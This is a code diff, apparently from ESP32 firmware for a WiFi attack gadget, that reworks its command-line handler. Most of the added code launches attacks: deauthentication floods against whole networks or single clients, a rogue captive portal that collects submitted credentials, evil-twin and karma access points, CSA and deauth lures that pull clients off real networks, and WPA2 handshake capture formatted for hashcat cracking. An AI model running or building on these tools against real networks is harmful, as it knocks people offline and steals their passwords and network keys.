-            else kon_printf(ks, "Not running.\r\n");
-            return 0;
-        }
-        if (bs_stricmp(verb, "start") == 0) {
+        /* deauth scan — one-shot AP discovery, no attack */
+        if (argc >= 3 && bs_stricmp(argv[2], "scan") == 0) {
             if (s_hl_mode != HL_IDLE) hl_stop();
             if (bs_wifi_init(s_arch) < 0) { kon_printf(ks, "WiFi init failed.\r\n"); return 1; }
-            uint8_t channel = 1;
-            for (int i = 3; i < argc - 1; i++) {
-                if (strcmp(argv[i], "--ch") == 0 && i+1 < argc) {
-                    int ch = atoi(argv[i+1]);
-                    if (ch >= 1 && ch <= 13) channel = (uint8_t)ch;
-                    i++;
+            deauth_svc_init(s_arch);
+            deauth_svc_scan_aps();
+            kon_printf(ks, "Scanning for APs... (q to abort)\r\n");
+            bool aborted = false;
+            for (;;) {
+                uint8_t ibuf[4];
+                int n = s_arch->uart_read(0, ibuf, (int)sizeof(ibuf));
+                for (int i = 0; i < n; i++) {
+                    if (ibuf[i]=='q'||ibuf[i]=='Q'||ibuf[i]==0x03) { aborted=true; break; }
+                }
+                if (aborted) break;
+                deauth_svc_tick(s_arch->millis());
+                if (deauth_svc_state() != DEAUTH_SVC_SCANNING) break;
+                s_arch->delay_ms(10);
+            }
+            if (aborted) { kon_printf(ks, "Aborted.\r\n"); }
+            else {
+                int n = deauth_svc_ap_count();
+                if (n == 0) { kon_printf(ks, "No APs found.\r\n"); }
+                else {
+                    kon_printf(ks, "%d AP(s) found:\r\n", n);
+                    kon_printf(ks, "  #   ch  rssi  BSSID              auth       SSID\r\n");
+                    for (int i = 0; i < n; i++) {
+                        const wifi_ap_entry_t* ap = deauth_svc_ap(i);
+                        if (!ap) continue;
+                        char mac[18]; bs_wifi_bssid_str(ap->ap.bssid, mac);
+                        kon_printf(ks, "  %2d  %2d  %4d  %s  %-10s %s\r\n",
+                                   i, ap->ap.channel, (int)ap->ap.rssi,
+                                   mac, bs_wifi_auth_str(ap->ap.auth),
+                                   ap->ap.ssid[0] ? ap->ap.ssid : "<hidden>");
+                    }
                 }
             }
-            deauth_svc_init(s_arch);
-            deauth_svc_attack_broadcast(channel);  /* shortcut: no scan needed */
-            s_hl_mode        = HL_WIFI_DEAUTH;
-            s_hl_ks          = ks;
-            s_hl_last_report = 0;
-            s_hl_last_log    = 0;
-            kon_printf(ks, "Deauth flood started (ch=%u, broadcast).\r\n"
-                           "Reports every 5 s.  'wifi deauth stop' to halt.\r\n",
-                       channel);
+            bs_wifi_deinit();
             return 0;
         }
-        kon_printf(ks, "Usage: wifi deauth start|stop [--ch N]\r\n");
+
+        bool want_help = false;
+        for (int i = 2; i < argc && !want_help; i++)
+            if (!strcmp(argv[i],"--help")||!strcmp(argv[i],"-h")) want_help=true;
+        if (want_help) {
+            kon_printf(ks,
+                "wifi deauth [OPTIONS]         deauth flood (runs until q / Ctrl+C)\r\n"
+                "wifi deauth scan              discover APs on air and print table\r\n"
+                "Options:\r\n"
+                "  --ch N                      channel 1-13 (default: 1)\r\n");
+            kon_printf(ks,
+                "  --bssid AA:BB:CC:DD:EE:FF   spoof frames from this BSSID\r\n"
+                "  --client AA:BB:CC:DD:EE:FF  target specific client (requires --bssid)\r\n"
+                "                              bidirectional: AP->client and client->AP\r\n");
+            kon_printf(ks,
+                "  --reason N                  reason code 1-65535 (default: rotating)\r\n");
+            kon_printf(ks,
+                "                              1=unspecified  2=prev-auth-invalid\r\n"
+                "                              3=leaving      4=inactivity  5=AP-busy\r\n"
+                "                              6=class2-nonauth  7=class3-nonassoc\r\n");
+            kon_printf(ks,
+                "  No --bssid:           broadcast flood, random spoofed src\r\n"
+                "  --bssid only:         targeted flood from that AP\r\n"
+                "  --bssid + --client:   single-client bidirectional deauth\r\n"
+                "  Press q / Ctrl+C to stop.\r\n");
+            return 0;
+        }
+        if (s_hl_mode != HL_IDLE) hl_stop();
+        if (bs_wifi_init(s_arch) < 0) { kon_printf(ks, "WiFi init failed.\r\n"); return 1; }
+        uint8_t  channel     = 1;
+        uint8_t  bssid[6];
+        uint8_t  client_mac[6];
+        bool     has_bssid   = false;
+        bool     has_client  = false;
+        uint16_t reason_code = 0;
+        for (int i = 2; i < argc; i++) {
+            if (!strcmp(argv[i],"--ch") && i+1<argc) {
+                int ch=atoi(argv[i+1]); if(ch>=1&&ch<=13) channel=(uint8_t)ch; i++;
+            } else if (!strcmp(argv[i],"--bssid") && i+1<argc) {
+                int v[6];
+                if (sscanf(argv[i+1],"%x:%x:%x:%x:%x:%x",
+                           &v[0],&v[1],&v[2],&v[3],&v[4],&v[5])==6) {
+                    for (int b=0;b<6;b++) bssid[b]=(uint8_t)v[b];
+                    has_bssid=true;
+                }
+                i++;
+            } else if (!strcmp(argv[i],"--client") && i+1<argc) {
+                int v[6];
+                if (sscanf(argv[i+1],"%x:%x:%x:%x:%x:%x",
+                           &v[0],&v[1],&v[2],&v[3],&v[4],&v[5])==6) {
+                    for (int b=0;b<6;b++) client_mac[b]=(uint8_t)v[b];
+                    has_client=true;
+                }
+                i++;
+            } else if (!strcmp(argv[i],"--reason") && i+1<argc) {
+                int r=atoi(argv[i+1]); if(r>=1&&r<=65535) reason_code=(uint16_t)r; i++;
+            } else {
+                kon_printf(ks,"Unknown argument: %s  (run with --help)\r\n",argv[i]); return 1;
+            }
+        }
+        if (has_client && !has_bssid) {
+            kon_printf(ks,"Error: --client requires --bssid. Run 'wifi deauth --help'.\r\n");
+            return 1;
+        }
+        deauth_svc_init(s_arch);
+        deauth_svc_set_reason(reason_code);
+        if (has_bssid && has_client) {
+            char bbuf[18], cbuf[18];
+            bs_wifi_bssid_str(bssid, bbuf); bs_wifi_bssid_str(client_mac, cbuf);
+            deauth_svc_attack_client(bssid, client_mac, channel);
+            kon_printf(ks,"[deauth] client  bssid=%s  client=%s  ch=%u%s\r\n",
+                       bbuf, cbuf, channel, reason_code?" reason=":"");
+            if (reason_code) kon_printf(ks,"  reason=%u\r\n", reason_code);
+        } else if (has_bssid) {
+            char mbuf[18]; bs_wifi_bssid_str(bssid, mbuf);
+            deauth_svc_attack_bssid(bssid, channel);
+            kon_printf(ks,"[deauth] targeted  bssid=%s  ch=%u%s\r\n",
+                       mbuf, channel, reason_code?" (fixed reason)":"");
+        } else {
+            deauth_svc_attack_broadcast(channel);
+            kon_printf(ks,"[deauth] broadcast  ch=%u%s\r\n",
+                       channel, reason_code?" (fixed reason)":"");
+        }
+        s_hl_mode=HL_WIFI_DEAUTH; s_hl_ks=ks; s_hl_last_report=0; s_hl_last_log=0;
+        hl_run_foreground(ks);
         return 0;
     }
 
     /* ---- sniff ---- */
     if (bs_stricmp(sub, "sniff") == 0) {
-        if (bs_stricmp(verb, "stop") == 0) {
-            if (s_hl_mode == HL_WIFI_SNIFF) { hl_stop(); kon_printf(ks, "Sniffer stopped.\r\n"); }
-            else kon_printf(ks, "Not running.\r\n");
+        bool want_help = false;
+        for (int i = 2; i < argc && !want_help; i++)
+            if (!strcmp(argv[i],"--help")||!strcmp(argv[i],"-h")) want_help=true;
+        if (want_help) {
+            kon_printf(ks,
+                "wifi sniff [OPTIONS]\r\n"
+                "  Passive 802.11 capture with filtering and optional pcap output.\r\n"
+                "Channel:\r\n"
+                "  --ch N       fixed channel 1-13 (default: auto-hop 1-13)\r\n");
+            kon_printf(ks,
+                "  --hop-ms N   dwell per channel in ms (default: 500)\r\n"
+                "  --timeout N  auto-stop after N seconds\r\n");
+            kon_printf(ks,
+                "Output:\r\n"
+                "  -v / --verbose             per-frame hex+ASCII dump\r\n"
+                "  --pcap [FILE]              write .pcap to SD (default: wifi/sniff/sniff.pcap)\r\n"
+                "Frame-type filter (last --type wins):\r\n"
+                "  --type mgmt|ctrl|data      all frames of that type\r\n");
+            kon_printf(ks,
+                "  --type beacon    beacons (sub 8)    --type probe   probe-req (4)\r\n"
+                "  --type proberesp probe-resp (5)     --type deauth  deauth (12)\r\n"
+                "  --type disassoc  disassoc (10)      --type auth    auth (11)\r\n"
+                "  --type assoc     assoc-req (0)\r\n");
+            kon_printf(ks,
+                "Address filters (all must match):\r\n"
+                "  --dst  AA:BB:CC:DD:EE:FF   Addr1 (destination)\r\n"
+                "  --src  AA:BB:CC:DD:EE:FF   Addr2 (source)\r\n"
+                "  --bssid AA:BB:CC:DD:EE:FF  Addr3 (BSSID)\r\n"
+                "Stats every 3s (10s verbose). q / Ctrl+C to stop.\r\n");
             return 0;
         }
-        if (bs_stricmp(verb, "start") == 0) {
-            if (s_hl_mode != HL_IDLE) hl_stop();
-            if (bs_wifi_init(s_arch) < 0) { kon_printf(ks, "WiFi init failed.\r\n"); return 1; }
-            uint8_t channel  = 0;  /* 0 = auto-hop */
-            for (int i = 3; i < argc - 1; i++) {
-                if (strcmp(argv[i], "--ch") == 0 && i+1 < argc) {
-                    int ch = atoi(argv[i+1]);
-                    if (ch >= 1 && ch <= 13) channel = (uint8_t)ch;
-                    i++;
-                }
+        if (s_hl_mode != HL_IDLE) hl_stop();
+        if (bs_wifi_init(s_arch) < 0) { kon_printf(ks, "WiFi init failed.\r\n"); return 1; }
+
+        memset(&s_sniff_ctx, 0, sizeof s_sniff_ctx);
+        s_sniff_ctx.filt_type    = SNIFF_FTYPE_ALL;
+        s_sniff_ctx.filt_subtype = SNIFF_FTYPE_ALL;
+        s_sniff_ctx.ks           = ks;
+
+        uint8_t     channel   = 0;
+        uint32_t    hop_ms    = 500;
+        const char* pcap_path = NULL;
+
+        for (int i = 2; i < argc; i++) {
+            if (!strcmp(argv[i],"--ch") && i+1<argc) {
+                int ch=atoi(argv[i+1]); if(ch>=1&&ch<=13) channel=(uint8_t)ch; i++;
+            } else if (!strcmp(argv[i],"--hop-ms") && i+1<argc) {
+                int ms=atoi(argv[i+1]); if(ms>=50) hop_ms=(uint32_t)ms; i++;
+            } else if (!strcmp(argv[i],"--timeout") && i+1<argc) {
+                int s=atoi(argv[i+1]); if(s>0) s_hl_timeout_ms=(uint32_t)s*1000u; i++;
+            } else if (!strcmp(argv[i],"--verbose")||!strcmp(argv[i],"-v")) {
+                s_sniff_ctx.verbose=true;
+            } else if (!strcmp(argv[i],"--pcap")) {
+                pcap_path=(i+1<argc&&argv[i+1][0]!='-')?argv[++i]:BS_PATH_SNIFF "/sniff.pcap";
+            } else if (!strcmp(argv[i],"--type") && i+1<argc) {
+                const char* t=argv[++i];
+                if      (bs_stricmp(t,"mgmt")    ==0){s_sniff_ctx.filt_type=0;s_sniff_ctx.filt_subtype=SNIFF_FTYPE_ALL;}
+                else if (bs_stricmp(t,"ctrl")    ==0){s_sniff_ctx.filt_type=1;s_sniff_ctx.filt_subtype=SNIFF_FTYPE_ALL;}
+                else if (bs_stricmp(t,"data")    ==0){s_sniff_ctx.filt_type=2;s_sniff_ctx.filt_subtype=SNIFF_FTYPE_ALL;}
+                else if (bs_stricmp(t,"beacon")  ==0){s_sniff_ctx.filt_type=0;s_sniff_ctx.filt_subtype=8; }
+                else if (bs_stricmp(t,"probe")   ==0){s_sniff_ctx.filt_type=0;s_sniff_ctx.filt_subtype=4; }
+                else if (bs_stricmp(t,"proberesp")==0){s_sniff_ctx.filt_type=0;s_sniff_ctx.filt_subtype=5; }
+                else if (bs_stricmp(t,"deauth")  ==0){s_sniff_ctx.filt_type=0;s_sniff_ctx.filt_subtype=12;}
+                else if (bs_stricmp(t,"disassoc")==0){s_sniff_ctx.filt_type=0;s_sniff_ctx.filt_subtype=10;}
+                else if (bs_stricmp(t,"auth")    ==0){s_sniff_ctx.filt_type=0;s_sniff_ctx.filt_subtype=11;}
+                else if (bs_stricmp(t,"assoc")   ==0){s_sniff_ctx.filt_type=0;s_sniff_ctx.filt_subtype=0; }
+                else { kon_printf(ks,"Unknown --type '%s'. Use --help.\r\n",t); return 1; }
+            } else if (!strcmp(argv[i],"--src") && i+1<argc) {
+                if (sniff_parse_mac(argv[++i],s_sniff_ctx.filt_src)) s_sniff_ctx.has_src=true;
+                else { kon_printf(ks,"Bad MAC: %s\r\n",argv[i]); return 1; }
+            } else if (!strcmp(argv[i],"--dst") && i+1<argc) {
+                if (sniff_parse_mac(argv[++i],s_sniff_ctx.filt_dst)) s_sniff_ctx.has_dst=true;
+                else { kon_printf(ks,"Bad MAC: %s\r\n",argv[i]); return 1; }
+            } else if (!strcmp(argv[i],"--bssid") && i+1<argc) {
+                if (sniff_parse_mac(argv[++i],s_sniff_ctx.filt_bssid)) s_sniff_ctx.has_bssid=true;
+                else { kon_printf(ks,"Bad MAC: %s\r\n",argv[i]); return 1; }
+            } else {
+                kon_printf(ks,"Unknown argument: %s  (run with --help)\r\n",argv[i]); return 1;
             }
-            sniffer_svc_init(s_arch);
-            sniffer_svc_start(channel, 500, NULL, NULL);  /* no pkt callback in CLI */
-            s_hl_mode        = HL_WIFI_SNIFF;
-            s_hl_ks          = ks;
-            s_hl_last_report = 0;
-            s_hl_last_total  = 0;
-            kon_printf(ks, "Sniffer started (ch=%u, %s).\r\n"
-                           "Reports every 3 s.  'wifi sniff stop' to halt.\r\n",
-                       channel ? channel : 1,
-                       channel ? "fixed" : "auto-hop");
-            return 0;
         }
-        kon_printf(ks, "Usage: wifi sniff start|stop [--ch N]\r\n");
+
+        if (pcap_path) {
+            if (!bs_fs_available()) { kon_printf(ks,"No SD card — pcap unavailable.\r\n"); return 1; }
+            bs_fs_mkdir_p(BS_PATH_SNIFF);
+            sniff_pcap_open(pcap_path);
+            if (!s_sniff_ctx.pcap_f) { kon_printf(ks,"Failed to open: %s\r\n",pcap_path); return 1; }
+        }
+
+        sniffer_svc_init(s_arch);
+        sniffer_svc_start(channel, hop_ms, sniff_pkt_cb, &s_sniff_ctx);
+        s_hl_mode=HL_WIFI_SNIFF; s_hl_ks=ks; s_hl_last_report=0; s_hl_last_total=0;
+
+        if (channel) kon_printf(ks,"[sniff] ch=%u  fixed",  channel);
+        else         kon_printf(ks,"[sniff] auto-hop  hop-ms=%lu", (unsigned long)hop_ms);
+        if (s_sniff_ctx.verbose) kon_printf(ks,"  verbose");
+        if (s_sniff_ctx.pcap_f)  kon_printf(ks,"  pcap=%s", pcap_path);
+        kon_printf(ks,"\r\n");
+        if (s_sniff_ctx.filt_type != SNIFF_FTYPE_ALL) {
+            static const char* const k_tnames[] = {"mgmt","ctrl","data","?"};
+            const char* tn = k_tnames[s_sniff_ctx.filt_type < 3 ? s_sniff_ctx.filt_type : 3];
+            if (s_sniff_ctx.filt_subtype == SNIFF_FTYPE_ALL)
+                kon_printf(ks,"  filter: type=%s\r\n", tn);
+            else
+                kon_printf(ks,"  filter: type=%s subtype=%u\r\n", tn, s_sniff_ctx.filt_subtype);
+        }
+        if (s_sniff_ctx.has_src || s_sniff_ctx.has_dst || s_sniff_ctx.has_bssid) {
+            char m[18];
+            if (s_sniff_ctx.has_dst)  { bs_wifi_bssid_str(s_sniff_ctx.filt_dst,  m); kon_printf(ks,"  filter: dst=%s\r\n",  m); }
+            if (s_sniff_ctx.has_src)  { bs_wifi_bssid_str(s_sniff_ctx.filt_src,  m); kon_printf(ks,"  filter: src=%s\r\n",  m); }
+            if (s_sniff_ctx.has_bssid){ bs_wifi_bssid_str(s_sniff_ctx.filt_bssid,m); kon_printf(ks,"  filter: bssid=%s\r\n",m); }
+        }
+        hl_run_foreground(ks);
         return 0;
     }
 
-    kon_printf(ks, "Usage: wifi beacon|deauth|sniff start|stop [...]\r\n");
+#if defined(BS_WIFI_ESP32) && defined(ARDUINO_ARCH_ESP32)
+    /* ---- captive ---- */
+    if (bs_stricmp(sub, "captive") == 0) {
+        bool want_help = false;
+        for (int i = 2; i < argc && !want_help; i++)
+            if (!strcmp(argv[i],"--help")||!strcmp(argv[i],"-h")) want_help=true;
+        if (want_help) {
+            kon_printf(ks,
+                "wifi captive [OPTIONS]\r\n"
+                "  Rogue AP + captive portal; captures submitted credentials.\r\n"
+                "Options:\r\n"
+                "  --ssid NAME    AP SSID (default: FreeWifi)\r\n"
+                "  --ch N         channel 1-13 (default: 1)\r\n"
+                "  --pass PSK     WPA2 passphrase (default: open)\r\n");
+            kon_printf(ks,
+                "  Portal URL:    http://192.168.4.1/\r\n"
+                "  Credentials printed live as clients submit the portal form.\r\n"
+                "  Press q / Ctrl+C to stop.\r\n");
+            return 0;
+        }
+        if (s_hl_mode != HL_IDLE) hl_stop();
+        if (bs_wifi_init(s_arch) < 0) { kon_printf(ks,"WiFi init failed.\r\n"); return 1; }
+        char    ssid[33]     = "FreeWifi";
+        uint8_t ch           = 1;
+        char    password[64] = "";
+        for (int i = 2; i < argc; i++) {
+            if (!strcmp(argv[i],"--ssid")&&i+1<argc) {
+                strncpy(ssid,argv[i+1],32); ssid[32]='\0'; i++;
+            } else if (!strcmp(argv[i],"--ch")&&i+1<argc) {
+                int c=atoi(argv[i+1]); if(c>=1&&c<=13) ch=(uint8_t)c; i++;
+            } else if (!strcmp(argv[i],"--pass")&&i+1<argc) {
+                strncpy(password,argv[i+1],63); password[63]='\0'; i++;
+            } else {
+                kon_printf(ks,"Unknown argument: %s  (run with --help)\r\n",argv[i]); return 1;
+            }
+        }
+        if (!captive_svc_start(ssid, ch, password[0]?password:NULL)) {
+            kon_printf(ks,"Portal start failed.\r\n"); return 1;
+        }
+        s_hl_mode=HL_WIFI_CAPTIVE; s_hl_ks=ks; s_hl_last_report=0; s_hl_last_cred=0;
+        kon_printf(ks,"[captive] ssid=\"%s\"  ch=%u  auth=%s\r\n",
+                   ssid, ch, password[0]?"WPA2":"open");
+        hl_run_foreground(ks);
+        return 0;
+    }
+
+    /* ---- eviltwin ---- */
+    if (bs_stricmp(sub, "eviltwin") == 0) {
+        bool want_help = false;
+        for (int i = 2; i < argc && !want_help; i++)
+            if (!strcmp(argv[i],"--help")||!strcmp(argv[i],"-h")) want_help=true;
+        if (want_help || argc < 3) {
+            kon_printf(ks,
+                "wifi eviltwin --ssid NAME [OPTIONS]\r\n"
+                "  Clone a target AP; optionally enables SOTA deauth+probe-inject.\r\n"
+                "Required:\r\n"
+                "  --ssid NAME                target SSID to clone\r\n");
+            kon_printf(ks,
+                "Options:\r\n"
+                "  --ch N                     channel 1-13 (default: 6)\r\n"
+                "  --pass PSK                 WPA2 passphrase (default: open)\r\n");
+            kon_printf(ks,
+                "  --bssid MAC   enables deauth-triggered client redirect:\r\n"
+                "    broadcast deauth (reason 7) from real BSSID every 100ms\r\n");
+            kon_printf(ks,
+                "    + probe-response injection when clients re-probe our SSID\r\n"
+                "    flow: deauth->probe-req->probe-resp->assoc->portal\r\n"
+                "  Press q / Ctrl+C to stop.\r\n");
+            return 0;
+        }
+        if (s_hl_mode != HL_IDLE) hl_stop();
+        if (bs_wifi_init(s_arch) < 0) { kon_printf(ks,"WiFi init failed.\r\n"); return 1; }
+        char    ssid[33]     = "";
+        uint8_t ch           = 6;
+        char    password[64] = "";
+        uint8_t bssid[6];
+        bool    has_bssid    = false;
+        for (int i = 2; i < argc; i++) {
+            if (!strcmp(argv[i],"--ssid")&&i+1<argc) {
+                strncpy(ssid,argv[i+1],32); ssid[32]='\0'; i++;
+            } else if (!strcmp(argv[i],"--ch")&&i+1<argc) {
+                int c=atoi(argv[i+1]); if(c>=1&&c<=13) ch=(uint8_t)c; i++;
+            } else if (!strcmp(argv[i],"--pass")&&i+1<argc) {
+                strncpy(password,argv[i+1],63); password[63]='\0'; i++;
+            } else if (!strcmp(argv[i],"--bssid")&&i+1<argc) {
+                int v[6];
+                if (sscanf(argv[i+1],"%x:%x:%x:%x:%x:%x",
+                           &v[0],&v[1],&v[2],&v[3],&v[4],&v[5])==6) {
+                    for(int b=0;b<6;b++) bssid[b]=(uint8_t)v[b];
+                    has_bssid=true;
+                }
+                i++;
+            } else {
+                kon_printf(ks,"Unknown argument: %s  (run with --help)\r\n",argv[i]); return 1;
+            }
+        }
+        if (!ssid[0]) {
+            kon_printf(ks,"Error: --ssid is required. Run 'wifi eviltwin --help'.\r\n");
+            return 1;
+        }
+        if (!eviltwin_svc_start(ssid, ch, password[0]?password:NULL,
+                                has_bssid?bssid:NULL)) {
+            kon_printf(ks,"Evil twin start failed.\r\n"); return 1;
+        }
+        s_hl_mode=HL_WIFI_EVILTWIN; s_hl_ks=ks; s_hl_last_report=0; s_hl_last_cred=0;
+        kon_printf(ks,"[eviltwin] ssid=\"%s\"  ch=%u  auth=%s  deauth=%s\r\n",
+                   ssid, ch, password[0]?"WPA2":"open",
+                   has_bssid?"enabled (SOTA chain)":"disabled (add --bssid to enable)");
+        hl_run_foreground(ks);
+        return 0;
+    }
+
+    /* ---- honeypot ---- */
+    if (bs_stricmp(sub, "honeypot") == 0) {
+        bool want_help = false;
+        for (int i = 2; i < argc && !want_help; i++)
+            if (!strcmp(argv[i],"--help")||!strcmp(argv[i],"-h")) want_help=true;
+        if (want_help) {
+            kon_printf(ks,
+                "wifi honeypot --ssid NAME --bssid MAC --ch N [OPTIONS]\r\n"
+                "  Clone AP, inject CSA+deauth lures to redirect its clients.\r\n"
+                "Required:\r\n"
+                "  --ssid NAME                real AP SSID to clone\r\n");
+            kon_printf(ks,
+                "  --bssid AA:BB:CC:DD:EE:FF  real AP BSSID\r\n"
+                "  --ch N                     real AP channel 1-13\r\n");
+            kon_printf(ks,
+                "Options:\r\n"
+                "  --hpch N                   rogue AP channel (default: auto {1,6,11})\r\n"
+                "  --mode broadcast|targeted  all clients or per-client deauth\r\n"
+                "  CSA+deauth lures injected every 8s to redirect clients.\r\n"
+                "  Press q / Ctrl+C to stop.\r\n");
+            return 0;
+        }
+        if (s_hl_mode != HL_IDLE) hl_stop();
+        if (bs_wifi_init(s_arch) < 0) { kon_printf(ks,"WiFi init failed.\r\n"); return 1; }
+        char    target_ssid[33] = "";
+        uint8_t target_bssid[6];
+        bool    has_bssid       = false;
+        uint8_t target_ch       = 0;
+        uint8_t hp_ch           = 0;
+        honeypot_svc_mode_t hpmode = HONEYPOT_SVC_BROADCAST;
+        for (int i = 2; i < argc; i++) {
+            if (!strcmp(argv[i],"--ssid")&&i+1<argc) {
+                strncpy(target_ssid,argv[i+1],32); target_ssid[32]='\0'; i++;
+            } else if (!strcmp(argv[i],"--bssid")&&i+1<argc) {
+                int v[6];
+                if (sscanf(argv[i+1],"%x:%x:%x:%x:%x:%x",
+                           &v[0],&v[1],&v[2],&v[3],&v[4],&v[5])==6) {
+                    for(int b=0;b<6;b++) target_bssid[b]=(uint8_t)v[b];
+                    has_bssid=true;
+                }
+                i++;
+            } else if (!strcmp(argv[i],"--ch")&&i+1<argc) {
+                int c=atoi(argv[i+1]); if(c>=1&&c<=13) target_ch=(uint8_t)c; i++;
+            } else if (!strcmp(argv[i],"--hpch")&&i+1<argc) {
+                int c=atoi(argv[i+1]); if(c>=1&&c<=13) hp_ch=(uint8_t)c; i++;
+            } else if (!strcmp(argv[i],"--mode")&&i+1<argc) {
+                if (bs_stricmp(argv[i+1],"targeted")==0) hpmode=HONEYPOT_SVC_TARGETED; i++;
+            } else {
+                kon_printf(ks,"Unknown argument: %s  (run with --help)\r\n",argv[i]); return 1;
+            }
+        }
+        if (!target_ssid[0]||!has_bssid||target_ch==0) {
+            kon_printf(ks,"Error: --ssid, --bssid and --ch are required. Run 'wifi honeypot --help'.\r\n");
+            return 1;
+        }
+        if (!honeypot_svc_start(target_ssid, target_bssid, target_ch, hp_ch, hpmode)) {
+            kon_printf(ks,"Honeypot start failed.\r\n"); return 1;
+        }
+        s_hl_mode=HL_WIFI_HONEYPOT; s_hl_ks=ks; s_hl_last_report=0; s_hl_last_cred=0;
+        kon_printf(ks,"[honeypot] ssid=\"%s\"  real-ch=%u -> rogue-ch=%u  mode=%s\r\n",
+                   target_ssid, target_ch,
+                   hp_ch?hp_ch:(uint8_t)(target_ch!=1?1:6),
+                   hpmode==HONEYPOT_SVC_TARGETED?"targeted":"broadcast");
+        hl_run_foreground(ks);
+        return 0;
+    }
+
+    /* ---- karma ---- */
+    if (bs_stricmp(sub, "karma") == 0) {
+        bool want_help = false;
+        for (int i = 2; i < argc && !want_help; i++)
+            if (!strcmp(argv[i],"--help")||!strcmp(argv[i],"-h")) want_help=true;
+        if (want_help) {
+            kon_printf(ks,
+                "wifi karma [OPTIONS]\r\n"
+                "  Rogue AP answering probe requests; captures portal credentials.\r\n"
+                "  Hops all 13 channels for probes; returns to AP ch to serve.\r\n");
+            kon_printf(ks,
+                "Options:\r\n"
+                "  --ssid NAME  SSID to advertise (default: FreeWifi)\r\n"
+                "  --ch N       AP channel 1-13 (default: 1)\r\n");
+            kon_printf(ks,
+                "  --auto       mirror every probed SSID, collect all clients\r\n"
+                "  Without --auto: respond only to probes matching --ssid.\r\n"
+                "  Press q / Ctrl+C to stop.\r\n");
+            return 0;
+        }
+        if (s_hl_mode != HL_IDLE) hl_stop();
+        if (bs_wifi_init(s_arch) < 0) { kon_printf(ks,"WiFi init failed.\r\n"); return 1; }
+        char    ssid[33]  = "FreeWifi";
+        uint8_t ch        = 1;
+        bool    auto_mode = false;
+        for (int i = 2; i < argc; i++) {
+            if (!strcmp(argv[i],"--ssid")&&i+1<argc) {
+                strncpy(ssid,argv[i+1],32); ssid[32]='\0'; i++;
+            } else if (!strcmp(argv[i],"--ch")&&i+1<argc) {
+                int c=atoi(argv[i+1]); if(c>=1&&c<=13) ch=(uint8_t)c; i++;
+            } else if (!strcmp(argv[i],"--auto")) {
+                auto_mode=true;
+            } else {
+                kon_printf(ks,"Unknown argument: %s  (run with --help)\r\n",argv[i]); return 1;
+            }
+        }
+        if (!karma_svc_start(ssid, ch, auto_mode)) {
+            kon_printf(ks,"Karma start failed.\r\n"); return 1;
+        }
+        s_hl_mode=HL_WIFI_KARMA; s_hl_ks=ks; s_hl_last_report=0; s_hl_last_cred=0;
+        kon_printf(ks,"[karma] ssid=\"%s\"  ch=%u  mode=%s\r\n",
+                   ssid, ch, auto_mode?"auto (all probe SSIDs)":"specific SSID");
+        hl_run_foreground(ks);
+        return 0;
+    }
+#endif /* BS_WIFI_ESP32 && ARDUINO_ARCH_ESP32 */
+
+    /* ---- eapol ---- */
+    if (bs_stricmp(sub, "eapol") == 0) {
+        bool want_help = false;
+        for (int i = 2; i < argc && !want_help; i++)
+            if (!strcmp(argv[i],"--help")||!strcmp(argv[i],"-h")) want_help=true;
+        if (want_help) {
+            kon_printf(ks,
+                "wifi eapol [OPTIONS]\r\n"
+                "  Passive WPA2 4-way handshake capture via 802.11 monitor mode.\r\n"
+                "  pcap output is compatible with hashcat -m 22000 and aircrack-ng.\r\n");
+            kon_printf(ks,
+                "Options:\r\n"
+                "  --bssid MAC    filter to this AP BSSID (default: all)\r\n"
+                "  --ch N         fixed channel 1-13 (default: auto-hop)\r\n"
+                "  --deauth       send broadcast deauth to trigger reauth (needs --bssid)\r\n");
+            kon_printf(ks,
+                "  --ivl N        deauth interval ms (default: 5000)\r\n"
+                "  --pcap [FILE]  write pcap to SD (default: wifi/eapol/eapol.pcap)\r\n"
+                "  --timeout N    auto-stop after N seconds\r\n");
+            kon_printf(ks,
+                "  Pair = M1 (AP->STA) + M2 (STA->AP) both captured.\r\n"
+                "  Press q / Ctrl+C to stop.\r\n");
+            return 0;
+        }
+        if (s_hl_mode != HL_IDLE) hl_stop();
+        if (bs_wifi_init(s_arch) < 0) { kon_printf(ks,"WiFi init failed.\r\n"); return 1; }
+
+        uint8_t     channel    = 0;
+        uint8_t     bssid[6];
+        bool        has_bssid  = false;
+        bool        do_deauth  = false;
+        uint32_t    deauth_ivl = 5000;
+        const char* pcap_path  = NULL;
+
+        for (int i = 2; i < argc; i++) {
+            if (!strcmp(argv[i],"--ch") && i+1<argc) {
+                int ch=atoi(argv[i+1]); if(ch>=1&&ch<=13) channel=(uint8_t)ch; i++;
+            } else if (!strcmp(argv[i],"--bssid") && i+1<argc) {
+                int v[6];
+                if (sscanf(argv[i+1],"%x:%x:%x:%x:%x:%x",
+                           &v[0],&v[1],&v[2],&v[3],&v[4],&v[5])==6) {
+                    for(int b=0;b<6;b++) bssid[b]=(uint8_t)v[b];
+                    has_bssid=true;
+                }
+                i++;
+            } else if (!strcmp(argv[i],"--deauth")) {
+                do_deauth=true;
+            } else if (!strcmp(argv[i],"--ivl") && i+1<argc) {
+                int ms=atoi(argv[i+1]); if(ms>=100) deauth_ivl=(uint32_t)ms; i++;
+            } else if (!strcmp(argv[i],"--pcap")) {
+                pcap_path=(i+1<argc&&argv[i+1][0]!='-')?argv[++i]:BS_PATH_EAPOL "/eapol.pcap";
+            } else if (!strcmp(argv[i],"--timeout") && i+1<argc) {
+                int s=atoi(argv[i+1]); if(s>0) s_hl_timeout_ms=(uint32_t)s*1000u; i++;
+            } else {
+                kon_printf(ks,"Unknown argument: %s  (run with --help)\r\n",argv[i]);
+                return 1;
+            }
+        }
+        if (do_deauth && !has_bssid) {
+            kon_printf(ks,"Error: --deauth requires --bssid.\r\n"); return 1;
+        }
+        if (pcap_path && !bs_fs_available()) {
+            kon_printf(ks,"No SD card -- pcap unavailable.\r\n"); return 1;
+        }
+        if (pcap_path) bs_fs_mkdir_p(BS_PATH_EAPOL);
+        eapol_svc_init(s_arch);
+        if (!eapol_svc_start(channel, has_bssid?bssid:NULL,
+                             do_deauth, deauth_ivl, pcap_path)) {
+            kon_printf(ks,"EAPOL capture start failed.\r\n"); return 1;
+        }
+        s_hl_mode=HL_WIFI_EAPOL; s_hl_ks=ks; s_hl_last_report=0; s_hl_last_clients=0;
+        char bbuf[18] = "any";
+        if (has_bssid) bs_wifi_bssid_str(bssid, bbuf);
+        kon_printf(ks,"[eapol] bssid=%s  ch=%s\r\n",
+                   bbuf, channel?"fixed":"auto-hop");
+        if (do_deauth)
+            kon_printf(ks,"[eapol] deauth every %lums (reason 7)\r\n",
+                       (unsigned long)deauth_ivl);
